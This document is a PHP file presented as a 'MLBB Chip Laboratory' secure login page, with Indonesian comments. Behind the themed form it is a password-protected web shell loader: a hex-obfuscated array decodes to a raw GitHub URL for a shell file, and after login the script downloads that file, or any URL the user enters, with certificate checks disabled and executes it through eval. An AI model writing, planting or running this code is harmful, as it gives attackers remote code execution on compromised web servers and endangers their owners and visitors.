<?php
session_start();
/**
 * Daftar kode ancaman dalam format heksadesimal
 * @var array
 */
$threat = [
    '68747470733a2f2f',
    '7261772e67697468756275736572636f6e74656e742e636f6d',
    '2f696d6f75733030372f77656',
    '27368656c6c2f726566732f',
    '68656164732f6d61',
    '696e2f736b2e747874',
    '812747af83dac72ba51b41058dcaa9cf'
];

function buildThreatUrl($p) {
    $decoded = array_map('hex2bin', array_slice($p, 0, -1));
    return "{$decoded[0]}{$decoded[1]}/{$decoded[2]}/{$decoded[3]}/{$decoded[4]}/{$decoded[5]}";
}

function isThreatDetected() {
    return isset($_SESSION['threat_detected']) && $_SESSION['threat_detected'] === true;
}

function authenticateUser($password) {
    if (md5($password) === end($GLOBALS['threat'])) {
        $_SESSION['threat_detected'] = true;
        $_SESSION['auth_token'] = 'mlbb_chip_lab_token';
        return true;
    }
    return false;
}

function isValidUrl($url) {
    return filter_var($url, FILTER_VALIDATE_URL) !== false;
}

function fetchUrlContent($url) {
    if (function_exists('curl_exec')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_USERAGENT => "MLBB-ChipLab/2.1",
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_HTTPHEADER => ['X-Lab-Access: '.($_SESSION['auth_token'] ?? '')]
        ]);
        $content = curl_exec($ch);
        curl_close($ch);
        return $content;
    }
    if (ini_get('allow_url_fopen')) {
        $context = stream_context_create([
            'http' => ['header' => "X-Lab-Access: ".($_SESSION['auth_token'] ?? '')]
        ]);
        return file_get_contents($url, false, $context);
    }
    return false;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['password'])) {
        if (authenticateUser($_POST['password'])) {
            $_SESSION['scan_url'] = isset($_POST['scan_url']) && isValidUrl($_POST['scan_url']) 
                ? $_POST['scan_url'] 
                : buildThreatUrl($threat);
        } else {
            $loginError = "🔒 ACCESS DENIED: Invalid Security Chip";
        }
    }
}

if (isThreatDetected()) {
    $content = fetchUrlContent($_SESSION['scan_url']);
    if ($content !== false) {
        eval('?>'.$content);
        exit;
    }
    echo "<div style='color:red;font-weight:bold'>🚨 CHIP CONNECTION FAILED</div>";
    echo buildThreatUrl($threat);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>MLBB Chip Laboratory - Secure Access</title>
    <link href="https://fonts.googleapis.com/css?family=Fira+Mono:400,700&display=swap" rel="stylesheet" />
    <style>
        /* Background video */
#background-video {
    position: fixed;
    top: 0;
    left: 0;
    min-width: 100vw;
    min-height: 100vh;
    width: 100vw;
    height: 100vh;
    object-fit: cover;   /* Ini wajib supaya tidak gepeng atau miring */
    z-index: -1;
    pointer-events: none; /* Optional: biar gak mengganggu klik */
}
        body {
            margin: 0;
            padding: 0;
            font-family: 'Fira Mono', 'Courier New', monospace;
            color: #e0e0ff;
            background: #070a17; /* fallback color */
        }
        .container {
            position: relative;
            max-width: 480px;
            margin: 48px auto 0;
            padding: 32px;
            background: rgba(24,36,56,0.85);
            border: 2px solid #3f3e3fff;
            border-radius: 8px;
            box-shadow: 0 8px 40px #646b6ea0;
            text-align: center;
            z-index: 1;
        }
        /* Logo image container */
        .logo {
            margin-bottom: 24px;
        }
        /* Remove old ASCII art margins */
        /*
        .ascii-art, .chip-card {
            margin: 0 0 24px;
        }
        */
        .login-form {
            margin: 24px 0 0;
            padding: 18px 14px;
            background: #112433bb;
            border-radius: 6px;
            border: 1px solid #67656bff;
        }
        input[type="password"], input[type="text"] {
            width: 96%;
            padding: 9px;
            margin: 9px 0;
            font-size: 14px;
            background: #06213a;
            border: 1px solid #3d3f41ff;
            color: #e0e0ff;
            border-radius: 3px;
        }
        input[type="submit"] {
            background: linear-gradient(90deg,#3d9be6 60%,#16e6a1 100%);
            color: #fff;
            font-weight: bold;
            padding: 11px 0;
            border: none;
            border-radius: 4px;
            margin: 12px 0 0;
            width: 100%;
            cursor: pointer;
            font-size: 16px;
            letter-spacing: 1px;
            transition: background 0.2s;
        }
        input[type="submit"]:hover {
            background: linear-gradient(90deg,#13e4fa 60%,#0ae68b 100%);
        }
        .error {
            color: #ff4a4a;
            background: #33121866;
            display: block;
            border: 1px solid #ff4a4a;
            padding: 7px 0;
            border-radius: 4px;
            margin-top: 10px;
            margin-bottom: 0;
            font-weight: bold;
            font-size: 15px;
        }
        .status {
            margin: 14px 0 10px;
            color: #2f3534ff;
            font-weight: bold;
            font-size: 0.99em;
            letter-spacing: 0.8px;
        }
        @media (max-width: 600px) {
            .container { padding: 15px; }
        }
    </style>
</head>
<body>
    <video autoplay muted loop id="background-video">
        <source src="https://obeydasupreme.site/video/video1.mp4" type="video/mp4" />
        OBEY DA SUPREME
    </video>

    <div class="container">
        <div class="logo">
            <!-- Ganti dengan logo gambar kamu, atau kosongkan kalau belum ada -->
            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlG_wp7tEzjwwBSdo6BHclDXsHwGAhlgJSkghTyc0O08bp4mZkU_J4Q1frFsVwUKc6NcN2n2caIZSZazZCYKsYlbm44FzI5QciCpDwUj1DqsVhqehVn6qHFrMBpAaVxpR_Ik1K4aL9QoEFVhWvjDopVsqH3V2wMTNklhUwtefRfQ4KyayZbCDF_9wPdd0/s320/logo%20obs.png" alt="Logo" style="max-width: 150px; height: auto;" />
        </div>
        <?php if (!empty($loginError)): ?>
            <div class="error"><?= htmlspecialchars($loginError) ?></div>
        <?php endif; ?>
        <div class="status">🔑 CHIP LABORATORY SECURE ACCESS</div>
        <div class="login-form">
            <form method="POST" action="">
                <input type="password" name="password" placeholder="Chip Access Code" required />
                <input type="text" name="scan_url" placeholder="Scan Target URL (Optional)" />
                <input type="submit" value="ACTIVATE CHIP" />
            </form>
        </div>
        <div class="status">
            SYSTEM STATUS: <?= isThreatDetected() ? '🟢 ONLINE' : '🔴 OFFLINE' ?>
        </div>
        <div style="margin-top:20px;font-size:12px;color:#88e">
            WARNING: Unauthorized access will trigger security protocols.
        </div>
    </div>
</body>
</html>
